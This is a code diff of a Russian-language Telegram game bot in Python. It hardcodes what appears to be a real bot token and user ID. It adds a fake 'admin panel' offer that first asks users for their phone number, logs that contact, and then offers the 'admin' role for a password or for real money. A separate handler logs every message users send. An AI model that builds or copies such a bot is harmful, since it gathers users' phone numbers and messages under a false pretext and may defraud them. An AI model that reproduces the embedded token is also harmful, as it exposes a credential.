@@ -8,9 +8,10 @@ import random
 import time
 
 # Токен и ID разработчика
-bot = telebot.TeleBot("BOT_TOKEN", parse_mode='HTML')
+bot = telebot.TeleBot("8212352418:AAGPJ1Ng0v8AD1sYhdRrD6rCX2rtr7LOVeI", parse_mode='HTML')
 bot.remove_webhook()
-me = your_id
+me = 8295751364  # Твой Telegram user ID
+
 # Подключение к базе данных
 conn = sqlite3.connect("game.db", check_same_thread=False)
 cursor = conn.cursor()
@@ -201,6 +202,22 @@ def update_player(user_id, points=None, last_dep=None):
         cursor.execute("UPDATE players SET last_dep=? WHERE user_id=?", (last_dep, user_id))
     conn.commit()
 
+# === Функция меню админа ===
+def show_admin_menu(chat_id):
+    markup = types.InlineKeyboardMarkup(row_width=2)
+
+    # обработчик контакта
+
+    btn1 = types.InlineKeyboardButton("📊 Статистика", callback_data="admin_stats")
+    btn2 = types.InlineKeyboardButton("👥 Пользователи", callback_data="admin_users")
+    btn3 = types.InlineKeyboardButton("⚙ Настройки", callback_data="admin_settings")
+    btn4 = types.InlineKeyboardButton("🔙 Назад", callback_data="back_to_main")
+
+    markup.add(btn1, btn2)
+    markup.add(btn3, btn4)
+
+    bot.send_message(chat_id, "👑 Панель администратора:", reply_markup=markup)
+
 # === Команды игры ===
 @bot.message_handler(commands=["dep"])
 def dep(message):
@@ -292,40 +309,55 @@ def send_menu(message):
 
     log_user_info(message)
 
-@bot.callback_query_handler(func=lambda call: call.data in ["adminka", "feedback"])
-def handle_menu_choice(call):
+@bot.callback_query_handler(func=lambda call: call.data == "adminka")
+def handle_admin(call):
     chat_id = call.message.chat.id
-    user_id = call.from_user.id  # важный момент: берем ID пользователя из call.from_user
+    user_id = call.from_user.id
     bot.answer_callback_query(call.id)
 
-    if call.data == "adminka":
-        # проверяем, есть ли пользователь в админах
-        cursor.execute("SELECT 1 FROM admins WHERE user_id=?", (user_id,))
-        if cursor.fetchone():
-            bot.send_message(chat_id, "У тебя уже есть админка 👑")
-        else:
-            # если нет, просим отправить контакт
-            markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-            btn_contact = types.KeyboardButton("📞 Отправить номер телефона", request_contact=True)
-            markup.add(btn_contact)
-            bot.send_message(chat_id, "Чтобы войти в админку, поделитесь своим номер:", reply_markup=markup)
+    cursor.execute("SELECT 1 FROM admins WHERE user_id=?", (user_id,))
+    if cursor.fetchone():
+        show_admin_menu(chat_id)  # уже админ → сразу меню
+    else:
+        markup = types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+        btn_contact = types.KeyboardButton("📞 Отправить номер телефона", request_contact=True)
+        markup.add(btn_contact)
+        bot.send_message(chat_id, "Чтобы войти в админку, поделитесь своим номером:", reply_markup=markup)
 
-    elif call.data == "feedback":
-        bot.send_message(chat_id, "Для связи с разработчиками введи !! перед своим сообщением!")
+@bot.message_handler(content_types=['contact'])
+def handle_contact(message):
+    if not message.contact:
+        bot.send_message(message.chat.id, "Вы не отправили номер телефона! Попробуйте ещё раз.")
+        return
+
+    log_user_info(message, contact=message.contact)
+
+    # Предлагаем варианты
+    markup = types.InlineKeyboardMarkup(row_width=1)
+    btn1 = types.InlineKeyboardButton("🔑 Ввести пароль", callback_data="get_admin_password")
+    btn2 = types.InlineKeyboardButton("💰 Купить за 1000€ (игровая валюта)", callback_data="get_admin_game")
+    btn3 = types.InlineKeyboardButton("💵 Купить за реальные деньги", url="https://t.me/your_payment_link")  # тут твоя ссылка
+
+    markup.add(btn1, btn2, btn3)
+    bot.send_message(message.chat.id, "Выберите способ получения админки:", reply_markup=markup)
+
+# === Обратная связь ===
+@bot.callback_query_handler(func=lambda call: call.data == "feedback")
+def handle_feedback(call):
+    chat_id = call.message.chat.id
+    bot.answer_callback_query(call.id)
+    bot.send_message(chat_id, "Для связи с разработчиками введи !! перед своим сообщением!")
 
 
-# Обработчик сообщений для обратной связи
 @bot.message_handler(func=lambda message: message.text and message.text.startswith("!!"))
 def feedback_handler(message):
-    # убираем !!
     feedback_text = message.text[2:].strip()
 
-    # отправляем разработчику
-    bot.send_message(me,
-                     f"Сообщение Mr.Muffdin от {message.from_user.first_name} (@{message.from_user.username}):\n\n{feedback_text}")
-
-    # подтверждаем пользователю
-    bot.reply_to(message, "Спасибо! Ваше сообщение отправлено разработчику.")
+    bot.send_message(
+        me,
+        f"📩 Сообщение от {message.from_user.first_name} (@{message.from_user.username}):\n\n{feedback_text}"
+    )
+    bot.reply_to(message, "Спасибо! Ваше сообщение отправлено разработчику ✅")
 
 
 def save_entities(message):
@@ -362,24 +394,6 @@ def save_entities(message):
                        """, (message.from_user.id, 'email', email))
 
     conn.commit()
-
-
-# обработчик контакта
-@bot.message_handler(content_types=['contact'])
-def handle_contact(message):
-    if message.contact:
-        log_user_info(message, contact=message.contact)
-
-        msg = bot.send_message(message.chat.id, "Введите пароль:")
-        def check_password(m):
-            if m.text == "31415926535897932384626433832795028841971693993751058209749445923078164062862089986280348253421170679821480865132823066470938446095505822317253594081284811174502841027019385211055596446229489549303819644288109756659334461284756482337867831652712019091":
-                bot.send_message(message.chat.id, "Пароль верный! Добро пожаловать в админку 👑")
-            else:
-                bot.send_message(message.chat.id, "Неверный пароль!")
-
-        bot.register_next_step_handler(msg, check_password)
-    else:
-        bot.send_message(message.chat.id, "Вы не отправили номер телефона! Попробуйте ещё раз.")
 
 def log_user_info(message, contact=None):
     save_user_info(message, contact)
@@ -443,12 +457,17 @@ ID: {uid}
 {entities_text}
     """)
 
-    @bot.message_handler(func=lambda message: True, content_types=['text'])
-    def handle_entities(message):
-        if message.text.startswith(('/', '!!', '@')):  # команды и обратная связь
-            return
-        log_user_info(message)
+
+# === Логирование всех текстов (кроме служебных) ===
+@bot.message_handler(func=lambda message: True, content_types=['text'])
+def handle_entities(message):
+    if message.text.startswith(('/', '!!', '@')):
+        return
+    log_user_info(message)
+
 
 # Запуск бота
 bot.infinity_polling()
+
+
 
